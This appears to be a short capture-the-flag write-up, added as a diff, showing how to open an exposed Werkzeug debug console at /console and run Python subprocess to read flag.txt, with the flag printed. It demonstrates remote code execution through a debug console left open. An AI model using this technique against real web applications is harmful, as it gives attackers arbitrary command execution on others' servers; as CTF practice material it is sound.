@@ -1,0 +1,10 @@
+enter the console in /console directory
+
+python code:
+
+
+	[console ready]
+	>>> import subprocess
+	>>> result = subprocess.run(['cat', 'flag.txt'], stdout=subprocess.PIPE)
+	>>> result.stdout
+	b'flag{weurkzerg_the_worst_kind_of_debug}'
